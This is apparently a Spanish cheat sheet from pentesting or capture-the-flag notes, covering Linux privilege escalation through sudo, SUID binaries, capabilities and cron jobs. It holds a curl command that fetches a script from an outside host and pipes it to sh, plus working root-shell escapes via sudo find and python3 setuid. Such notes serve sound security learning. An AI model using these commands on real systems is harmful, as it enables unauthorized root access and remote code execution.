---
title: Escalada en Linux
order: 1
description: Vectores de privesc en Linux — SUID, sudo, capabilities, cron, kernel exploits y enumeración automatizada.
---

## Enumeración rápida

```bash wrap=false
id; sudo -l
uname -a
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

Automatiza con **linpeas**:

```bash wrap=false
curl 10.10.14.5/linpeas.sh | sh
```

## sudo

Si `sudo -l` permite ejecutar binarios, consulta [GTFOBins](https://gtfobins.github.io/):

```bash wrap=false
sudo -l
# (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit
```

## Binarios SUID

```bash wrap=false
find / -perm -4000 -type f 2>/dev/null
```

Un SUID con bit de root mal configurado permite ejecutar como root. Cruza el binario con GTFOBins.

## Capabilities

```bash wrap=false
getcap -r / 2>/dev/null
# /usr/bin/python3 = cap_setuid+ep
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

## Cron jobs

```bash wrap=false
cat /etc/crontab
ls -la /etc/cron.*
```

Un script ejecutado por root con permisos de escritura para tu usuario es escalada directa.
